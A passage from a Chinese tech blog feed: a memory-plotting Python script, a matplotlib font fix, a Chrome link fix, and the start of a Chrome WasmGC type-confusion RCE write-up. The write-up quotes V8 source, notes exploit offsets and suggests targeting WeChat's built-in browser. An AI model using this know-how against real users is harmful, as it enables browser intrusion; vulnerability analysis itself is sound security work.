class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">'timestamps'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> data<span class="token punctuation">[</span><span class="token string">'memory_usage'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            timestamps <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'timestamps'</span><span class="token punctuation">]</span>            memory_usages <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'memory_usage'</span><span class="token punctuation">]</span>            command <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'command'</span><span class="token punctuation">]</span>            file_path <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'file_path'</span><span class="token punctuation">]</span>            <span class="token comment"># 过滤数据，智能选择采样点</span>            filtered_timestamps<span class="token punctuation">,</span> filtered_memory_usages <span class="token operator">=</span> filter_data<span class="token punctuation">(</span>timestamps<span class="token punctuation">,</span> memory_usages<span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>filtered_timestamps<span class="token punctuation">,</span> filtered_memory_usages<span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'o'</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">'-'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string"> (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>title<span class="token punctuation">&#125;</span></span><span class="token string"> - PID: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pid<span class="token punctuation">&#125;</span></span><span class="token string">, Program: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> fontproperties<span class="token operator">=</span>font_prop<span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">"时间"</span><span class="token punctuation">,</span> fontproperties<span class="token operator">=</span>font_prop<span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">"内存使用率 (%)"</span><span class="token punctuation">,</span> fontproperties<span class="token operator">=</span>font_prop<span class="token punctuation">)</span>            <span class="token comment"># 设置 x 轴格式化</span>            plt<span class="token punctuation">.</span>gca<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>xaxis<span class="token punctuation">.</span>set_major_locator<span class="token punctuation">(</span>mdates<span class="token punctuation">.</span>AutoDateLocator<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>gca<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>xaxis<span class="token punctuation">.</span>set_major_formatter<span class="token punctuation">(</span>mdates<span class="token punctuation">.</span>DateFormatter<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">,</span> fontproperties<span class="token operator">=</span>font_prop<span class="token punctuation">)</span>                        plt<span class="token punctuation">.</span>tight_layout<span class="token punctuation">(</span><span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>            <span class="token comment"># 标注峰值</span>            max_memory_index <span class="token operator">=</span> filtered_memory_usages<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>filtered_memory_usages<span class="token punctuation">)</span><span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>annotate<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filtered_memory_usages<span class="token punctuation">[</span>max_memory_index<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">&#125;</span></span><span class="token string">%"</span></span><span class="token punctuation">,</span>                          <span class="token punctuation">(</span>filtered_timestamps<span class="token punctuation">[</span>max_memory_index<span class="token punctuation">]</span><span class="token punctuation">,</span> filtered_memory_usages<span class="token punctuation">[</span>max_memory_index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                          textcoords<span class="token operator">=</span><span class="token string">"offset points"</span><span class="token punctuation">,</span> xytext<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ha<span class="token operator">=</span><span class="token string">'center'</span><span class="token punctuation">,</span> fontproperties<span class="token operator">=</span>font_prop<span class="token punctuation">)</span>            <span class="token comment"># 保存图像到 img 目录，文件名包含PID和时间跨度</span>            filename <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"memory_usage_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pid<span class="token punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>start_time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>end_time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">.png"</span></span>            plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>img_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>            plt<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"已生成并保存内存使用情况折线图：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_time_range</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    根据用户选项返回时间范围。    """</span>    now <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> option <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>seconds<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'5'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'6'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'7'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'8'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'9'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> now <span class="token operator">-</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">'10'</span><span class="token punctuation">:</span>        start_str<span class="token punctuation">,</span> end_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入时间范围 (格式: YYYYMMDDHHMMSS-YYYYMMDDHHMMSS): "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>        start_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>start_str<span class="token punctuation">,</span> <span class="token string">"%Y%m%d%H%M%S"</span><span class="token punctuation">)</span>        end_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>end_str<span class="token punctuation">,</span> <span class="token string">"%Y%m%d%H%M%S"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> start_time<span class="token punctuation">,</span> end_time    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"无效选项，请重新选择。"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请选择生成图表的时间范围："</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1: 最近30秒"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2: 最近1分钟"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3: 最近5分钟"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"4: 最近30分钟"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"5: 最近1小时"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"6: 最近3小时"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"7: 最近6小时"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"8: 最近12小时"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"9: 最近24小时"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"10: 用户自选时间段"</span><span class="token punctuation">)</span>    option <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入选项编号: "</span><span class="token punctuation">)</span>    start_time<span class="token punctuation">,</span> end_time <span class="token operator">=</span> get_time_range<span class="token punctuation">(</span>option<span class="token punctuation">)</span>    <span class="token keyword">if</span> start_time <span class="token keyword">and</span> end_time<span class="token punctuation">:</span>        processes <span class="token operator">=</span> parse_log_data<span class="token punctuation">(</span>start_time<span class="token punctuation">,</span> end_time<span class="token punctuation">)</span>        plot_memory_usage<span class="token punctuation">(</span>processes<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>start_time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token punctuation">&#123;</span>end_time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> start_time<span class="token punctuation">,</span> end_time<span class="token punctuation">)</span></code></pre><h3 id="错误排查"><a href="#错误排查" class="headerlink" title="错误排查"></a>错误排查</h3><p>findfont: Generic family ‘sans-serif’ not found because none of the following families were found: SimHei<br><a href="https://topk-li.github.io/2024/09/14/matplotlib-zi-ti-wen-ti/">https://topk-li.github.io/2024/09/14/matplotlib-zi-ti-wen-ti/</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib字体问题</title>
      <link href="/2024/09/14/matplotlib-zi-ti-wen-ti/"/>
      <url>/2024/09/14/matplotlib-zi-ti-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>报错findfont: Generic family ‘sans-serif’ not found because none of the following families were found: SimHei</p><span id="more"></span><p>报错信息表明 matplotlib 无法找到 SimHei 字体。可能的原因是字体没有正确安装或路径不正确，或者 matplotlib 的字体缓存未刷新。<br>解决方案<br>确认字体安装：确保 <code>SimHei.ttf</code> 已正确安装在系统的字体目录中。<br>手动配置 <code>matplotlib</code> 字体路径：将 <code>SimHei.ttf</code> 的具体路径添加到 <code>matplotlib</code> 的字体路径中。</p><h3 id="1：手动安装并配置-SimHei-字体"><a href="#1：手动安装并配置-SimHei-字体" class="headerlink" title="1：手动安装并配置 SimHei 字体"></a>1：手动安装并配置 <code>SimHei</code> 字体</h3><p>下载 <code>SimHei.ttf</code> 字体<br>运行以下命令下载 <code>SimHei</code> 字体：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-O</span> SimHei.ttf https://github.com/chinese-fonts/simhei/raw/master/SimHei.ttf</code></pre><h3 id="2-将字体文件复制到系统字体目录"><a href="#2-将字体文件复制到系统字体目录" class="headerlink" title="2.将字体文件复制到系统字体目录"></a>2.将字体文件复制到系统字体目录</h3><p>将下载的字体文件复制到系统字体目录中：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /usr/share/fonts/truetype/simhei<span class="token function">sudo</span> <span class="token function">cp</span> SimHei.ttf /usr/share/fonts/truetype/simhei/</code></pre><h3 id="3-刷新字体缓存"><a href="#3-刷新字体缓存" class="headerlink" title="3.刷新字体缓存"></a>3.刷新字体缓存</h3><p>执行以下命令来刷新字体缓存：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> fc-cache <span class="token parameter variable">-fv</span></code></pre><h3 id="4-验证字体安装"><a href="#4-验证字体安装" class="headerlink" title="4.验证字体安装"></a>4.验证字体安装</h3><p>检查字体是否正确安装：</p><pre class="language-bash" data-language="bash"><code class="language-bash">fc-list <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"SimHei"</span></code></pre><p>如果看到了类似的输出，说明字体已经成功安装。</p><h3 id="手动指定-matplotlib-使用的字体路径"><a href="#手动指定-matplotlib-使用的字体路径" class="headerlink" title="手动指定 matplotlib 使用的字体路径"></a>手动指定 matplotlib 使用的字体路径</h3><p>如果问题仍然存在，可以手动将字体路径指定给 <code>matplotlib</code>。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 手动添加字体路径</span>font_path <span class="token operator">=</span> <span class="token string">'/usr/share/fonts/truetype/simhei/SimHei.ttf'</span>font_prop <span class="token operator">=</span> fm<span class="token punctuation">.</span>FontProperties<span class="token punctuation">(</span>fname<span class="token operator">=</span>font_path<span class="token punctuation">)</span><span class="token comment"># 设置 Matplotlib 字体以支持中文</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>  <span class="token comment"># 虽然指定了字体名，我们也需要使用FontProperties来确保字体加载</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 解决负号显示问题</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Bugs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修复 chrome 打不开第三方应用内链接</title>
      <link href="/2024/09/03/xiu-fu-chrome-da-bu-kai-di-san-fang-ying-yong-nei-lian-jie/"/>
      <url>/2024/09/03/xiu-fu-chrome-da-bu-kai-di-san-fang-ying-yong-nei-lian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="默认浏览器为-Chrome-时打不开第三方应用内链接（点击没有反应）"><a href="#默认浏览器为-Chrome-时打不开第三方应用内链接（点击没有反应）" class="headerlink" title="默认浏览器为 Chrome 时打不开第三方应用内链接（点击没有反应）"></a>默认浏览器为 Chrome 时打不开第三方应用内链接（点击没有反应）</h2><span id="more"></span><p>举例：当默认浏览器设置为 chrome 时，并且 chrome 已经打开的情况下，在微信内设置链接通过默认浏览器打开后点击链接总是没有反应。<br>当 chrome 处于关闭状态时，点击链接 chrome 能够正常弹出。</p><h2 id="罪魁祸首：金格插件KGChromePlugin"><a href="#罪魁祸首：金格插件KGChromePlugin" class="headerlink" title="罪魁祸首：金格插件KGChromePlugin"></a>罪魁祸首：金格插件KGChromePlugin</h2><p>chrome 的启动参数被 KGChromePlugin 金格插件篡改了，从而导致第三方应用无法调用 chrome 打开超链接。<br>1.chrome:&#x2F;&#x2F;version&#x2F; 查看命令行中是否含有 –register-pepper-plugins&#x3D;”C:...”<br><img src="/images/2024/09/03/c5681b02-4615-441e-8a0b-228da063102c.png"><br>根据路径信息卸载金格插件,通常路径为<code>C:\Program Files (x86)\KGChromePlugin</code>卸载程序为<code>KGPMUninstall.exe</code><br>重启chrome恢复正常。<br>2.（不是百试百灵）在设置中将默认浏览器更改为其他浏览器（例如edge）再改回chrome后恢复正常。</p>]]></content>
      
      
      <categories>
          
          <category> 运维笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Chrome </tag>
            
            <tag> BUG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Chrome RCE——CVE-2024-2887的变体漏洞</title>
      <link href="/2024/08/27/google-chrome-rce-cve-2024-2887-de-bian-ti-lou-dong/"/>
      <url>/2024/08/27/google-chrome-rce-cve-2024-2887-de-bian-ti-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="Chrome-RCE-Poc概述"><a href="#Chrome-RCE-Poc概述" class="headerlink" title="Chrome-RCE-Poc概述"></a>Chrome-RCE-Poc概述</h2><ul><li>漏洞名称：Google Chrome 沙箱穿越</li><li>CVE编号：多个CVE组合攻击</li><li>威胁类型：代码执行</li><li>利用可能性：高</li><li>POC状态：已公开</li><li>在野利用状态：未公开</li><li>EXP状态：已公开</li><li>技术细节状态：已公开</li><li>危害描述：攻击者可通过诱导用户打开恶意链接来利用此漏洞，从而获取敏感信息或代码执行。</li></ul><p>This can be considered a variant bug of CVE-2024-2887 discovered by Manfred Paul and presented in Vancouver 2024.</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>++Chrome版本v125.0.6422.113++<br>Exp中内核偏移量需满足<code>chrome_leak &amp; 0xffff == 0xfd00</code><br><img src="/images/2024/08/28/64f839b7-68a7-420a-af98-30e2b18bea6f.png"><br>提供个思路：<br>微信中内置浏览器为大版本122的Chrome，通过Debug找到该版本偏移量来进行利用，就可以在微信想给谁弹计算器就给谁弹了</p><h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>WASM 等递归规范类型<code>id</code>&lt;-&gt; <code>wasm::HeapType</code>&#x2F; <code>wasm::ValueTypeJS</code> 到 <code>WASM</code> 的转换函数及其包装器（<code>FromJS()</code>、<code>(Wasm)JSToWasmObject()</code>等）中的混淆，导致任意 <code>WASM</code>类型之间的类型混淆。<br>这可以被认为是 <code>Manfred Paul</code> 发现并在 2024 年温哥华会议上提出的<code>CVE-2024-2887</code>的变种漏洞。</p><h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>独立安全研究员 <code>Seunghyun Lee (@0x10n)</code> 参加 <code>SSD Secure Disclosure</code> 的<code>TyphoonPWN 2024</code></p><h2 id="供应商回应"><a href="#供应商回应" class="headerlink" title="供应商回应"></a>供应商回应</h2><p>供应商已在 Google Chrome 版本 124 中发布了针对此漏洞的修复程序</p><h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>Google Chrome 123 及更早版本</p><h2 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h2><p><a href="https://github.com/WebAssembly/gc/blob/main/proposals/gc/MVP.md">WasmGC 中的类型</a>经过规范化，以允许跨模块类型检查。由于 WasmGC 允许同递归类型，因此需要支持位于不同模块中各自的递归组之间的类型比较。V8 通过将单个隔离中所有模块的所有类型“规范化”为唯一标识的索引<code>uint32_t</code>来实现这一点。此过程在<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/canonical-types.cc">https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/canonical-types.cc</a> 中实现，但一个非常简单的 TL;DR 将是：</p><ol><li>根据以下规则规范化递归组中的类型索引：</li><li>类型索引已定义（在其递归组之外）-&gt; 使用已规范化的值</li><li>代表同一组内不同类型的类型索引 -&gt; 从第一个类型计算相对类型索引并标记为相对</li><li>如果数据库中已存在规范化递归组，则使用已保存的索引</li><li>否则，将递归组保存到数据库中并创建新的索引（增量）<br>通过这种方式，WasmGC 支持结构类型等价的概念——即，当以任何顺序规范化时<code>(type $t1 (struct (mut i32) (mut i64)))</code>，来自模块 M1 的等价于<code>(type $t2 (struct (mut i32) (mut i64)))</code>来自模块 M2 的等价，将其扩展到更复杂的递归组，并且该想法仍然成立。<br>全局规范化数据库由单例类管理<code>TypeCanonicalizer</code>：<pre class="language-c" data-language="c"><code class="language-c">TypeCanonicalizer<span class="token operator">*</span> <span class="token function">GetTypeCanonicalizer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">GetWasmEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">type_canonicalizer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>class TypeCanonicalizer <span class="token punctuation">&#123;</span> public<span class="token operator">:</span>  <span class="token keyword">static</span> constexpr <span class="token class-name">uint32_t</span> kPredefinedArrayI8Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">static</span> constexpr <span class="token class-name">uint32_t</span> kPredefinedArrayI16Index <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">static</span> constexpr <span class="token class-name">uint32_t</span> kNumberOfPredefinedTypes <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token comment">//...</span> private<span class="token operator">:</span>  <span class="token comment">//...</span>  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint32_t</span><span class="token operator">></span> canonical_supertypes_<span class="token punctuation">;</span>  <span class="token comment">// Maps groups of size >=2 to the canonical id of the first type.</span>  std<span class="token operator">::</span>unordered_map<span class="token operator">&lt;</span>CanonicalGroup<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token punctuation">,</span> base<span class="token operator">::</span>hash<span class="token operator">&lt;</span>CanonicalGroup<span class="token operator">>></span>      canonical_groups_<span class="token punctuation">;</span>  <span class="token comment">// Maps group of size 1 to the canonical id of the type.</span>  std<span class="token operator">::</span>unordered_map<span class="token operator">&lt;</span>CanonicalSingletonGroup<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token punctuation">,</span>                     base<span class="token operator">::</span>hash<span class="token operator">&lt;</span>CanonicalSingletonGroup<span class="token operator">>></span>      canonical_singleton_groups_<span class="token punctuation">;</span>  <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>规范类型 ID <code>uint32_t</code>是类型的全局唯一ID代表隔离内的特定 WasmGC 类型。<code>canonical_supertypes_</code>是一个表示类型之间子类型关系的向量，其中<code>canonical_supertypes_[sub] = super</code>sub表示是（规范类型 ID 中的所有）super的超类型。</li></ol><p>每个 WASM 模块都保存一个向量，用于将其内部类型索引转换为规范化类型索引：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">V8_EXPORT_PRIVATE</span> WasmModule <span class="token punctuation">&#123;</span>  <span class="token comment">//...</span>  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>TypeDefinition<span class="token operator">></span> types<span class="token punctuation">;</span>  <span class="token comment">// by type index</span>  <span class="token comment">// Maps each type index to its global (cross-module) canonical index as per</span>  <span class="token comment">// isorecursive type canonicalization.</span>  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint32_t</span><span class="token operator">></span> isorecursive_canonical_type_ids<span class="token punctuation">;</span>  <span class="token comment">//...</span><span class="token punctuation">&#125;</span></code></pre><p>在这种情况下，<code>isorecursive_canonical_type_ids[t] = c</code>意味着类型索引<code>t</code>被规范化为类型 id <code>c</code>。<br>注意，单个WASM模块可以拥有的最大类型索引数<code>t</code>是<code>kV8MaxWasmTypes</code>，即<code>1000000</code>。这在解码阶段<code>DecodeTypeSection()</code>中强制执行。然而，一个重要的观察结果是，规范类型id没有以任何方式绑定到<code>kV8MaxWasmTypes</code>——它可以根据主机内存支持的大小增长到主机内存支持的最大数量，因此我们可以简单地制作更多具有不同类型的 WASM 模块。<br>快速外部引用可以查看如何<code>isorecursive_canonical_type_ids</code>使用返回<code>WasmWrapperGraphBuilder::FromJS()</code>、运行时函数<code>WasmJSToWasmObject()</code>调用<code>JSToWasmObject()</code>等。查看前者，我们看到以下代码：</p><pre class="language-c" data-language="c"><code class="language-c">Node<span class="token operator">*</span> <span class="token function">FromJS</span><span class="token punctuation">(</span>Node<span class="token operator">*</span> input<span class="token punctuation">,</span> Node<span class="token operator">*</span> js_context<span class="token punctuation">,</span> wasm<span class="token operator">::</span>ValueType type<span class="token punctuation">,</span>             <span class="token keyword">const</span> wasm<span class="token operator">::</span>WasmModule<span class="token operator">*</span> module<span class="token punctuation">,</span> Node<span class="token operator">*</span> frame_state <span class="token operator">=</span> nullptr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> wasm<span class="token operator">::</span>kRef<span class="token operator">:</span>    <span class="token keyword">case</span> wasm<span class="token operator">::</span>kRefNull<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">heap_representation_non_shared</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//...</span>        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kNone<span class="token operator">:</span>        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span class="token operator">::</span>kNoFunc<span class="token operator">:</span>        <span class="token keyword">case</span> wasm<span class="token operator">::</span>HeapType<span 